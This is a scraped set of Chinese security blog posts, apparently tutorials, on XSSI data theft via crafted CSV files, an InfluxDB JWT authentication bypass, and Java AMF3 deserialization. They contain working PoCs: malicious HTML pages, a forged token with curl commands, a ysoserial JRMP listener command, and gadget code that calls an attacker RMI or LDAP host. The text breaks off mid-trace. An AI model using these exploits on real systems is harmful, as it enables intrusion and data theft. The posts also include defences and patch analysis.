123451,&quot;a&quot;,mi1k7ea=function()&#123;/*&quot;,&quot;123@123.com&quot;,&quot;03-0000-0001&quot;2,&quot;admin&quot;,&quot;456@456.com&quot;,&quot;03-0000-0002&quot;3,&quot;guest&quot;,&quot;789@789.com&quot;,&quot;03-0000-0003&quot;4,&quot;tester&quot;,&quot;abc@abc.com&quot;,&quot;03-0000-0004&quot;5,&quot;*/&#125;//&quot;,&quot;def@def.com&quot;,&quot;03-0000-0005&quot; xssi.html，调用mi1k7ea.toString()获取函数源码来达到攻击目标数据的目的： 1234567891011121314&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;script src=\"http://192.168.10.131:81/a.csv\"&gt;&lt;/script&gt;&lt;script&gt; alert(mi1k7ea.toString());&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在IE 11中测试成功： 为啥能成功执行？我们将CSV文件内容直接放到IE的Console中运行，浏览器是能够成功识别为JS代码并定义了一个名为mi1k7ea的JS函数： 也就是说，通过可控字段构造CSV文件的目的就是为了让文件内容使浏览器能够正常识别为JS代码，并且将中间的敏感信息都注释掉，然后通过调用toString()函数来获取JS函数源码从而成功窃取敏感信息。 其实前面那段CSV内容放到Chrome和Firefox中都能成功识别为JS的，结果和IE的一样，但为啥不能在XSSI中利用呢？——原因在于目前较新版本的Chrome和Firefox都已经将MIME类型为text/csv的响应都自动拦截掉了，因此无法成功利用： 利用ECMAScript6特性——‘`’反引号业界研究的这种技巧，是针对Chrome和Firefox的利用的，因为，但是在目前的Chrome和Firefox中已经不再能成功利用，原因如前面所说，Chrome和Firefox都已经将MIME类型为text/csv的响应都自动拦截掉了。 但是我们还是来看下这个原理和利用吧。 假设目标CSV文件如下，其中’Sample report’这个字段是我们可以控制的： 1234report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed 然后我们构造如下，将’Sample’作为JS变量，变量内容未反引号括起来的内容，最后需要注释掉后面部分的内容才能使浏览器识别JS不会报错： 1234report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status1234,Sample=` report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed1234,Sample`// report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed xssi.html，注意定义CSV中第一行的项为变量： 1234567891011121314151617&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;script&gt; var report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;&lt;/script&gt;&lt;script src=\"http://192.168.10.131:81/a.csv\"&gt;&lt;/script&gt;&lt;script&gt; alert(Sample.toString());&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在Chrome或Firefox上测试是不成功的，原因同上： 但是这段CSV在Firefox和Chrome上的Console上是能成功识别并执行的，也就是说构造本身是没问题的： 利用ECMAScript6特性——箭头函数a.csv，假设num和b项可控： 123456name,num,teamJordan,23,BullKobe,24,LakerJames,23,LakerIversion,3,76era,b,c 构造如下： 123456name,num=i=&gt;/*,teamJordan,23,BullKobe,24,LakerJames,23,LakerIversion,3,76era,b*/i//,c xssi.html： 1234567891011121314151617&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;script&gt; var report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;&lt;/script&gt;&lt;script src=\"http://192.168.10.131:81/a.csv\"&gt;&lt;/script&gt;&lt;script&gt; alert(num.toString());&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 在Chrome和Firefox上运行会报错，原因同上。 但是这段CSV在Firefox和Chrome上的Console上是能成功识别并执行的，也就是说构造本身是没问题的： 窃取非JS、非CSV类型文件敏感信息前面三种方法，对于现在较新版本的Chrome和Firefox都是失效，但是如果目标文件类型并非是JS/CSV的话，就能够通过可控字段来构造文件内容实现在Chrome和Firefox上的执行，这是因为响应的MIME类型并非text/csv，也就不会被浏览器所拦截了。 比如前面的三种方法中，将a.csv改为a.txt，在Chrome和Firefox上能成功执行： 在前面的第二种方法中，还有一种构造形式，即将Sample后面的=等号去掉，也就是说直接将Sample当成函数进行定义，a.txt如下： 1234report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at,status1234,Sample` report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed1234,Sample report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed1234,Sample`// report,Sample Program,100.0,100.0,0.0,USD,2017-01-01 12:30:00 UTC,confirmed xssi.html修改如下，直接获取Sample函数的参数内容： 12345678910111213141516171819&lt;!--恶意页面--&gt;&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;title&gt;XSSI Attack&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h2&gt;XSSI Attack&lt;/h2&gt;&lt;script&gt; var report_id,report_title,program_name,total_amount,amount,bonus_amount,currency,awarded_at;&lt;/script&gt;&lt;script&gt; function Sample(strings)&#123; alert(strings); &#125;&lt;/script&gt;&lt;script src=\"http://192.168.10.131:81/a.txt\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt; 这样同样能利用成功。 参照这些例子，同理去挖掘即可。 网上的案例Yahoo的XSSI，窃取动态JS文件中的session值，进而窃取受害者账号的具体信息：挖洞经验 | 看我如何发现雅虎XSSi漏洞实现用户信息窃取 Hackerone的XSSI，CSV文件内容的窃取以及非JS非CSV类型文件内容的窃取：【技术分享】hackerone漏洞：如何利用XSSI窃取多行字符串（含演示视频） 演示视频 0x04 防御 开发者永远也不要把敏感数据放在JavaScript文件中， 也不要放在JSONP中； 请求敏感文件/响应的尽量改为POST方式； 使用类似于CSRF-Token机制； 设置响应头为X-Content-Type-Options: nosniff，此时浏览器就会拒绝加载JS类型的数据； 0x05 参考使用XSSI攻击获取敏感信息 XSSI攻击利用 – 大学生 揭开XSSI攻击的神秘面纱 【技术分享】XSSI： 一个不出名但是影响广泛的Web漏洞","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSSI","slug":"XSSI","permalink":"https://www.mi1k7ea.com/tags/XSSI/"}]},{"title":"浅析Influxdb认证绕过漏洞","date":"2020-01-01T14:35:17.000Z","path":"2020/01/01/浅析Influxdb认证绕过漏洞/","text":"0x01 基本概念Influxdb简介TSDB（Time Series DataBase，时序数据库）是针对时间戳或时间序列数据进行优化的数据库，专门为处理带有时间戳的度量和事件度量而构建的。而时间序列数据可以是随时间跟踪、监视、下采样和聚合的度量或事件，如服务器指标、应用程序性能、网络数据、传感器数据以及许多其他类型的分析数据。 Influxdb是一个开源的时序数据库，由GO语言编写，用于处理高写入和高查询负载。Influxdb被广泛应用于存储系统的监控数据，IoT行业的实时数据等场景。 关键特性Influxdb具有以下关键特性： 能够高速读取和压缩时间序列数据 使用 Go 编写，能够但文件运行，没有依赖 提供了简单、高效的 HTTP 读写接口 能够使用插件支持其他的数据协议，如： Graphite=， =collectd 和 OpenTSDB 可轻松使用 SQL 语言查询聚合数据 能够使用 Tag 进行快速高效的查询 支持保留策略(Retention Policy), 能够自动清理旧数据 支持持续查询，能够自动定期计算聚合数据，提高了查询的效率 与传统数据库的概念比较 Influxdb 传统数据库 database 数据库 measurement 表，但不支持联合查询 point 表中的一行数据 其中point由时间戳（time）、数据（field）、标签（tags）组成，相当于传统数据库里的一行数据： point属性 传统数据库中的概念 time 主键 tags 有索引的列 fields 没索引的列 目录与文件结构Influxdb的数据存储即在其根目录下的database目录中主要有三个目录。默认情况下是meta、wal和data。 meta目录：用于存储数据库的一些元数据，meta目录下有一个meta.db文件； wal目录：存放预写日志文件，以.wal结尾； data目录：存放实际存储的数据文件，以.tsm结尾。 配置InfluxDB的配置文件为：/etc/influxdb/influxdb.conf 选项详情请参见：Configuration Settings 常用的InfluxQL语句123456789101112131415161718-- 查看所有的数据库show databases;-- 使用特定的数据库use database_name;-- 查看所有的measurementshow measurements;-- 查询10条数据select * from measurement_name limit 10;-- 数据中的时间字段默认显示的是一个纳秒时间戳，改成可读格式precision rfc3339; -- 之后再查询，时间就是rfc3339标准格式-- 或可以在连接数据库的时候，直接带该参数influx -precision rfc3339-- 查看一个measurement中所有的tag key show tag keys-- 查看一个measurement中所有的field key show field keys-- 查看一个measurement中所有的保存策略(可以有多个，一个标识为default)show retention policies; Influxdb函数详解参考：influxdb函数详解 HTTP接口Influxdb相关接口具体可参考官方文档： 下面之看下几个简单的例子。 /query数据主要使用/query接口查询，下面给出一些常见用法，而更多用法参见：Querying data with the HTTP API 。 创建数据库 POST请求可用于创建数据库，如： 1curl -X POST http://localhost:8086/query --data-urlencode \"q=CREATE DATABASE &lt;databasename&gt;\" 查询 1curl -X GET http://localhost:8086/query?pretty=true --data-urlencode 'db=&lt;database name&gt;' --data-urlencode 'q=SELECT \"field1\",\"tag1\"... FROM &lt;measurement&gt; WHERE &lt;condition&gt;' /write发送POST请求是写入数据的主要方式，下面给出一些常见用法，而更多用法参见：Writing data with the HTTP API 。 插入一条Point： 1curl -X POST http://localhost:8086/write?db=&lt;database name&gt; --data-binary \"cpu_load,machine=001,region=cn value=0.56 1555164637838240795\" 必须指定database name 身份认证机制——JWTInfluxdb支持基于密码的身份认证和基于JWT的身份认证。 下面详细介绍JWT机制。 JWT基本原理JWT即JSON Web Tokens，是目前最流行的跨域身份验证解决方案。 JWT的原理就是在服务器身份验证之后，将生成一个JSON对象并将其发送回用户，如下： 12345&#123; \"Username\": \"mi1k7ea\", \"Role\": \"Admin\", \"Expire\": \"2020-01-01 00:00:00\"&#125; 此后，用户与服务端通信时，都要发回这个JSON对象。服务器完全只靠这个对象认定用户身份。为了防止用户篡改数据，服务器在生成这个对象的时候，会加上签名。 服务器不保存任何session数据，也就是说，服务器变成无状态，从而比较容易实现扩展。 JWT原理图如下： JWT结构一个示例的JWT如下： 1eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c 这是一个很长的字符串，中间用点.分隔成三个部分。 一个JWT实际上就是一个字符串，由三部分组成： Header（头部） Payload（载荷） Signature（签名） Header（头部）Header部分是一个JSON对象，描述JWT的元数据，通常是下面的样子。 1234&#123; \"alg\": \"HS256\", \"typ\": \"JWT\"&#125; 上面代码中，alg属性表示签名的算法（algorithm），默认是HMAC SHA256（写成HS256）；typ属性表示这个令牌（token）的类型（type），JWT令牌统一写为JWT。 最后，将上面的JSON对象使用Base64URL算法转成字符串。 Payload（载荷）Payload部分也是一个JSON对象，用来存放实际需要传递的数据。JWT规定了7个官方字段供选用： iss (issuer)：签发人 exp (expiration time)：过期时间 sub (subject)：主题 aud (audience)：受众 nbf (Not Before)：生效时间 iat (Issued At)：签发时间 jti (JWT ID)：编号 除了官方字段，你还可以在这个部分定义私有字段，下面就是一个例子。 12345&#123; \"sub\": \"1234567890\", \"name\": \"John Doe\", \"admin\": true&#125; 注意，JWT默认是不加密的，任何人都可以读到，所以不要把秘密信息放在这个部分。 这个JSON对象也要使用Base64URL算法转成字符串。 Signature（签名）Signature部分是对前两部分的签名，防止数据篡改。 首先，需要指定一个密钥（secret）。这个密钥只有服务器才知道，不能泄露给用户。然后，使用 Header 里面指定的签名算法（默认是HMAC SHA256），按照下面的公式产生签名： 1234HMACSHA256( base64UrlEncode(header) + \".\" + base64UrlEncode(payload), secret) 算出签名以后，把Header、Payload、Signature三个部分拼成一个字符串，每个部分之间用.分隔，就可以返回给用户。 Base64URL算法前面提到，Header和Payload串型化的算法是Base64URL。这个算法跟Base64算法基本类似，但有一些小的不同。 JWT作为一个令牌（token），有些场合可能会放到URL（比如api.example.com/?token=xxx）。Base64有三个字符+、/和=，在URL里面有特殊含义，所以要被替换掉：=被省略、+替换成-，/替换成_ 。这就是Base64URL算法。 JWT的用法客户端收到服务器返回的JWT，可以储存在Cookie或LocalStorage中。 此后，客户端每次与服务器通信，都要带上这个JWT。你可以把它放在Cookie里面自动发送，但是这样不能跨域，所以更好的做法是放在HTTP请求的头信息Authorization字段里面： 1Authorization: Bearer &lt;token&gt; 另一种做法是，跨域的时候JWT就放在POST请求的数据体里面。 如何生成JWT在线网站可生成JWT凭据：https://jwt.io/ 0x02 Influxdb认证绕过漏洞影响版本Influxdb &lt; 1.7.6 的版本。 漏洞原理及代码审计Influxdb认证绕过漏洞，说白了就是默认的不安全配置导致的逻辑漏洞（未校验JWT的Signature部分的secret即密钥是否为空），可导致正常的身份认证被绕过。在Influxdb中，JWT的默认设置不会在“共享秘密”键中创建任何值。换句话说，默认情况下，创建有效的JWT令牌所需的“secret”为空。 下面我们下载1.7.5版本的Influxdb源码进行GO语言的代码审计，可控漏洞点出在哪里。 我们知道PoC是如下的形式： 1curl -G 'http://xxx:8086/query' --data-urlencode 'q=show users' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k' 那么直接搜索关键词来寻找对应的认证代码，如搜索“Authorization”，找到influxdb-1.7.5\\services\\httpd\\handler.go这个文件。在其中看到authenticate()即认证函数，这里会调用parseCredentials()函数来解析凭证，然后根据返回的凭证方法到下面的switch语句中匹配： 跟进parseCredentials()函数，当中获取Authorization头字段，若不为空，则通过空格切割其值，然后switch语句匹配第一个值的内容，当匹配到“Bearer”时则返回包含Method为“BearerAuthentication”的creds变量： 返回到authenticate()函数中，继续往下，就能匹配到switch语句的BearerAuthentication代码块： 这段代码解析到token具体的值后，获取其中声明的exp和username的值，这里exp需要满足float64类型的数值、username需要是个字符串类型，接着根据username即用户名去查找是否存在该用户，若都不报错则调用inner()函数成功往下执行，即认证成功。 在这里我们可以明显看到，我们的JWT的Signature部分的secret即密钥是可以设置为空的，因为这里没有对其是否为空进行校验，并且默认也是为空的，即： 123HMACSHA256( base64UrlEncode(header) + \".\" + base64UrlEncode(payload),) 由于没有使用密钥对前面两个部分的内容进行加密，因此任意用户只要知道用户名就可以构造JWT凭证来绕过认证。 漏洞复现环境搭建这里我们使用Docker来搭建漏洞环境。 依次执行如下命令即可： 12345678# 搜索Influxdb Docker容器docker search influxdb# 拉取漏洞版本的镜像docker pull influxdb:1.7.5# 运行docker容器docker run -it -d --name influxdb -p 8086:8086 influxdb:1.7.5# 进入运行的docker容器中docker exec -it influxdb /bin/bash 接着新建数据库用户，在influx终端运行如下命令创建新用户mi1k7ea： 12345678&gt; use _internalUsing database _internal&gt; create user \"mi1k7ea\" with password '123456' with all privileges&gt; show usersuser admin---- -----mi1k7ea true&gt; 然后在Influxdb的配置文件/etc/influxdb/influxdb.conf中添加配置开启认证： 然后重启即可。 信息搜集先确定版本号是否存在漏洞，这里看到版本为1.7.5 &lt; 1.7.6，是存在认证绕过漏洞的版本： 接着，判断Influxdb服务绑定的端口号以及是否在公网进行监听： 默认情况下，Influxdb服务是绑定在8086端口上供其他进程访问的。如果是监听在公网上，则存在未授权访问漏洞，漏洞危害达到最大化。 下面的利用先在本地测试。 输入如下命令进行用户名发现： 1curl -G 'http://127.0.0.1:8086/debug/requests' 可以看到并没有返回数据库相关的用户名。 尝试直接访问/query接口，发现没有认证凭据不能访问： 1curl -G -X POST 'http://127.0.0.1:8086/query' --data-urlencode 'q=show users' 构造PoC下面我们就来构造实现认证绕过的JWT。 由前面的分析知道，我们需要填写的仅仅是第二部分的Payload中的username和exp而已。这里username是Influxdb中存在的用户名即可，而exp (expiration time)即认证有效时间，需要我们设置得比当前时间大。 我们可以通过在线工具方便地获取： 除了线上的方法，这里列下几种编程语言生成时间戳的代码实现。 Java： 1(int) (System.currentTimeMillis() / 1000) Python： 12import timetime.time() PHP： 1time() 这样，就可以直接到https://jwt.io/中构造JWT了，这里攻击者只需知道Influxdb数据库存在mi1k7ea用户即可（注意：第三部分Signature中的secret即密钥设置为空，因为默认都是无共享密钥的，即使目标服务端设置了我们也无从知道也无法利用）： 最终PoC如下： 1curl -G 'http://127.0.0.1:8086/query' --data-urlencode 'q=show users' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k' 本地利用效果如图，成功查询得到用户信息： 修改下PoC的利用方式，添加新的数据库： 1curl -G 'http://127.0.0.1:8086/query' --data-urlencode 'q=create database hacked' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE1Nzg1ODU2MDAsInVzZXJuYW1lIjoibWkxazdlYSJ9.eVk8Dp16Oz-0qqXN0eEZKXqQErlLRgAhe60yzholS7k' 远程利用也是一样的，直接往目标服务端的Influxdb接口发送PoC即可成功利用： 补丁分析这里下载1.7.6版本的Influxdb，打开influxdb-1.7.6\\services\\httpd\\handler.go这个文件对比发现，在解析JWT之前多了一段代码： 可以看到该代码判断当前JWT的secret即密钥是否为空，若为空则直接报错，从而修补了漏洞。 修复方案升级Influxdb至最新版即可。 0x03 参考When all else fails – find a 0-day JSON Web Token 入门教程","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"GO","slug":"GO","permalink":"https://www.mi1k7ea.com/tags/GO/"},{"name":"Influxdb","slug":"Influxdb","permalink":"https://www.mi1k7ea.com/tags/Influxdb/"}]},{"title":"Java AMF3反序列化漏洞","date":"2019-12-07T03:36:41.000Z","path":"2019/12/07/Java-AMF3反序列化漏洞/","text":"0x01 基本概念AMF是Action Message Format的简称，是一种二进制序列化格式，主要用于数据交互和远程过程调用。 一个Action Message由头部（header）和主体（body）所组成。 AMF3（Action Message Format version 3）是AMF的第三版，同样是一种二进制信息编码格式，也是Flash应用在后台交互时主要使用的一种数据格式。与JSON类似，它支持不同的数据类型。考虑到向后兼容性，AMF3实际上算是AMF的一种扩展实现，并且引入了新的对象类型。 AMF3对象的新功能可以归结为两种新增加的特性，即Dynamic和Externalizable，这两种新特性描述了对象是如何进行序列化操作的： Dynamic：一个声明了动态特性的类实例，公共变量成员可以在程序运行时动态添加/删除到实例中； Externalizable：实现flash.utils.Externalizable并完全控制器成员序列化的类实例； Dynamic特性 我们可以拿Dynamic特性与JavaBeans的功能进行对比：它允许我们通过类名及属性来创建一个对象。实际上，很多JavaBeans实体目前已经实现了这种技术，例如java.beans.Introspector、Flamingo、Flex BlazeDS和WebORB等等。 但需要注意的是，这种功能将会导致一种可利用的漏洞产生。实际上，Wouter Coekaerts早在2011年就已经将这种存在于AMF实现中的漏洞曝光了，并且还在2016年发布了相应漏洞的利用代码及PoC。 Externalizable特性 我们可以拿Externalizable特性赖于Java的java.io.Externalizable接口进行对比。实际上，很多厂商早就已经将flash.utils.IExternalizable接口的规范进行了调整，其实它与Java的java.io.Externalizable区别不大，这种特性将允许我们可以高效地对实现了java.io.Externalizable接口的类进行重构。 java.io.Externalizable接口定义了两个方法：即readExternal（java.io.ObjectInput）和writeExternal（java.io.ObjectInput），而这两个方法将允许java类完全控制序列化以及反序列化操作。这也就意味着，在程序的运行过程中不存在默认的序列化／反序列化行为以及有效性检测。因此，相对于java.io.Serializable来说，我们使用java.io.Externalizable来实现序列化／反序列化则更加的简单和高效。 0x02 使用AMF3序列化和反序列化本地测试用的jar：flex-messaging-core-4.7.2，flex-messaging-common-4.7.2。 Person类，注意该类需要实现Serializable接口类才能实现序列化和反序列化： 123456789101112131415161718192021222324252627282930313233public class Person implements Serializable &#123; private String name; private int age; public Person() &#123; System.out.println(\"Person构造函数\"); &#125; public String getName() &#123; System.out.println(\"Person.getName()\"); return name; &#125; public void setName(String name) &#123; System.out.println(\"Person.setName()\"); this.name = name; &#125; public int getAge() &#123; System.out.println(\"Person.getAge()\"); return age; &#125; public void setAge(int age) &#123; System.out.println(\"Person.setAge()\"); this.age = age; &#125; @Override public String toString() &#123; return \"Person [name=\" + name + \", age=\" + age + \"]\"; &#125;&#125; AMFDemo.java： 123456789101112131415161718192021222324252627282930313233343536public class AMFDemo &#123; public static void main(String[] args) throws Exception &#123; Person person = new Person(); person.setName(\"mi1k7ea\"); person.setAge(6); // 序列化对象，生成AMF Message对象 byte[] amf = serialize(person); System.out.println(\"序列化：\" + amf); // 反序列化对象 ActionMessage actionMessage = deserialize(amf); System.out.println(\"反序列化：\" + actionMessage); &#125; public static byte[] serialize(Object data) throws IOException &#123; MessageBody body = new MessageBody(); body.setData(data); ActionMessage message = new ActionMessage(); message.addBody(body); ByteArrayOutputStream out = new ByteArrayOutputStream(); AmfMessageSerializer serializer = new AmfMessageSerializer(); serializer.initialize(SerializationContext.getSerializationContext(), out, null); serializer.writeMessage(message); return out.toByteArray(); &#125; public static ActionMessage deserialize(byte[] amf) throws ClassNotFoundException, IOException &#123; ByteArrayInputStream in = new ByteArrayInputStream(amf); AmfMessageDeserializer deserializer = new AmfMessageDeserializer(); deserializer.initialize(SerializationContext.getSerializationContext(), in, null); ActionMessage actionMessage = new ActionMessage(); deserializer.readMessage(actionMessage, new ActionContext()); return actionMessage; &#125;&#125; 输出： 12345678910Person构造函数Person.setName()Person.setAge()Person.getName()Person.getAge()序列化：[B@681a9515Person构造函数Person.setName()Person.setAge()反序列化：flex.messaging.io.amf.ActionMessage@27bc2616 0x03 AMF3反序列化过程在AMF3反序列化过程中，程序会从Action消息中获取类名，构造新的对象，然后以成员值作为参数调用每个成员名对应的setter方法。这一个过程由专门的方法来实现，比如flex.messaging.io.amf.Amf3Input类中的readScriptObject()方法或者flex.messaging.io.amf.Amf0Input类中的readObjectValue()方法。 在deserialize()函数中，调用了AmfMessageDeserializer.readMessage()函数来读取Action Message内容，而在其中会调用readBody()函数来进一步读取Action Message的主体内容： 接着会调用AmfMessageDeserializer.readObject()函数： 往下跟进去，看到调用Amf0Input.readObject()，其中获取到type为17，然后调用readObjectValue()： 跟进readObjectValue()函数，由于type为17，就会进入调用Amf3Input.readObject()的逻辑： 跟进Amf3Input.readObject()函数，这里获取到type为10，再调用Amf3Input.readObjectValue()： 跟进Amf3Input.readObjectValue()函数，在AMF3协议中，当type数据类型为10时，则认为Java对象，就会调用readScriptObject()读取对象： 跟进readScriptObject()函数，看到调用createObjectInstance()函数来新建对象实例，可以看到是直接创建Person类实例了： 在AbstractAmfInput.createObjectInstance()函数中，调用AbstractProxy.createInstance()函数来新建实例： 再往下就是具体调用创建对象实例的函数调用过程、调用Person类构造函数。 此时函数调用栈如下： 1234567891011121314151617181920&lt;init&gt;:7, PersonnewInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)newInstance:62, NativeConstructorAccessorImpl (sun.reflect)newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)newInstance:422, Constructor (java.lang.reflect)newInstance:442, Class (java.lang)createDefaultInstance:120, ClassUtil (flex.messaging.util)createInstanceFromClassName:95, AbstractProxy (flex.messaging.io)createInstance:115, AbstractProxy (flex.messaging.io)createObjectInstance:169, AbstractAmfInput (flex.messaging.io.amf)readScriptObject:746, Amf3Input (flex.messaging.io.amf)readObjectValue:154, Amf3Input (flex.messaging.io.amf)readObject:132, Amf3Input (flex.messaging.io.amf)readObjectValue:122, Amf0Input (flex.messaging.io.amf)readObject:93, Amf0Input (flex.messaging.io.amf)readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)deserialize:40, AMFDemomain:19, AMFDemo 继续往下调试，调用完Person类的构造函数创建了对象实例后，程序会返回到Amf3Input.readScriptObject()函数中继续执行，会通过for循环遍历属性并调用BeanProxy.setValue()函数进行属性值的设置： 我们跟进几层，看到set()函数是通过反射机制来调用目标属性的setter方法的： 往下就是反射调用对应的属性的setter方法，此时的函数调用栈如下： 1234567891011121314151617setName:17, Personinvoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:497, Method (java.lang.reflect)set:867, BeanProxy$BeanProperty (flex.messaging.io)setValue:284, BeanProxy (flex.messaging.io)readScriptObject:776, Amf3Input (flex.messaging.io.amf)readObjectValue:154, Amf3Input (flex.messaging.io.amf)readObject:132, Amf3Input (flex.messaging.io.amf)readObjectValue:122, Amf0Input (flex.messaging.io.amf)readObject:93, Amf0Input (flex.messaging.io.amf)readObject:199, AmfMessageDeserializer (flex.messaging.io.amf)readBody:173, AmfMessageDeserializer (flex.messaging.io.amf)readMessage:93, AmfMessageDeserializer (flex.messaging.io.amf)deserialize:40, AMFDemomain:19, AMFDemo 接着遍历其他属性并反射调用其setter方法直至完成属性值的设置，最后返回对象实例。 此时可以看到，AMF3将对象方锦龙ActionMessage的body中，其属性值在data可看到： 0x04 AMF3反序列化漏洞影响版本Apache Flex BlazeDS的4.6.0.23207版本及4.7.x系列&lt;4.7.3版本的都存在反序列化漏洞。 具体地说，是flex-messaging-xx系列jar包的4.6.0.23207版本及4.7.x系列&lt;4.7.3版本的存在漏洞。 漏洞原理简单地说，AMF3反序列化漏洞原理就是反序列化调用了JavaBeans存在漏洞的setter方法导致的。 复现利用基于UnicastRef的Gadget修改AMFDemo.java，添加生成generateUnicastRef类对象： 12345678910111213141516171819202122232425262728293031323334353637383940public class AMFDemo &#123; public static void main(String[] args) throws Exception &#123; Object object = generateUnicastRef(\"192.168.10.129\", 1234); // 序列化对象，生成AMF Message对象 byte[] amf = serialize(object); // 反序列化对象 ActionMessage actionMessage = deserialize(amf); System.out.println(\"ActionMessage: \" + actionMessage); &#125; public static Object generateUnicastRef(String host, int port) &#123; java.rmi.server.ObjID objId = new java.rmi.server.ObjID(); sun.rmi.transport.tcp.TCPEndpoint endpoint = new sun.rmi.transport.tcp.TCPEndpoint(host, port); sun.rmi.transport.LiveRef liveRef = new sun.rmi.transport.LiveRef(objId, endpoint, false); return new sun.rmi.server.UnicastRef(liveRef); &#125; public static byte[] serialize(Object data) throws IOException &#123; MessageBody body = new MessageBody(); body.setData(data); ActionMessage message = new ActionMessage(); message.addBody(body); ByteArrayOutputStream out = new ByteArrayOutputStream(); AmfMessageSerializer serializer = new AmfMessageSerializer(); serializer.initialize(SerializationContext.getSerializationContext(), out, null); serializer.writeMessage(message); return out.toByteArray(); &#125; public static ActionMessage deserialize(byte[] amf) throws ClassNotFoundException, IOException &#123; ByteArrayInputStream in = new ByteArrayInputStream(amf); AmfMessageDeserializer deserializer = new AmfMessageDeserializer(); deserializer.initialize(SerializationContext.getSerializationContext(), in, null); ActionMessage actionMessage = new ActionMessage(); deserializer.readMessage(actionMessage, new ActionContext()); return actionMessage; &#125;&#125; 测试下代码能否正常运行，监听下端口，看看是否能够成功建立连接： 此时，我们成功与客户端建立了一条通信连接，而且使用的还是Java RMI传输协议。 利用ysoserial工具，前提是目标环境存在可被反序列化利用的类，这里假设存在CommonsBeanutils1： 1java -cp ysoserial.jar ysoserial.exploit.JRMPListener 1234 CommonsBeanutils1 calc.exe 在Kali运行该命令开启JRMPListener监听，运行程序后Kali端接受到数据后就会发送payload，在Windows端就会弹计算器： 基于JdbcRowSetImpl的GadgetJdbcRowSetImpl这条Gadget十分经典，原理和调试分析就不多说了，直接看PoC示例。 注意，下面的代码写得有问题，只是给个示例方便自己记录一下，后面再进行分析修改。 修改AMFDemo.java，传入一个JdbcRowSetImpl类对象进行反序列化，其中设置了DataSourceName和AutoCommit属性值： 1234567891011121314151617181920212223public class AMFDemo &#123; public static void main(String[] args) throws Exception &#123; Object object = createPoC(\"127.0.0.1\", 1389); // 序列化对象，生成AMF Message对象 byte[] amf = serialize(object); // 反序列化对象 ActionMessage actionMessage = deserialize(amf); &#125; public static Object createPoC(String host, int port) &#123; com.sun.rowset.JdbcRowSetImpl jdbcRowSet = new com.sun.rowset.JdbcRowSetImpl(); try &#123; jdbcRowSet.setDataSourceName(\"ldap://\" + host + \":\" + port + \"/Exploit\"); jdbcRowSet.setAutoCommit(true); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; return jdbcRowSet; &#125; ... 之所以能触发，和AMF3没有直接关系，是前面初始化JdbcRowSetImpl类对象的时候触发的： 调试分析这里只对UnicastRef这条Gadget进行调试分析。 反序列化过程在之前已经整体跟踪分析过了，我们看下关键的几个地方。 我们直接在UnicastRef.invoke()方法上打断点，调试直接运行到这，此时函数调用栈如下： 123456789101112131415161718invoke:377, UnicastRef (sun.rmi.server)dirty:-1, DGCImpl_Stub 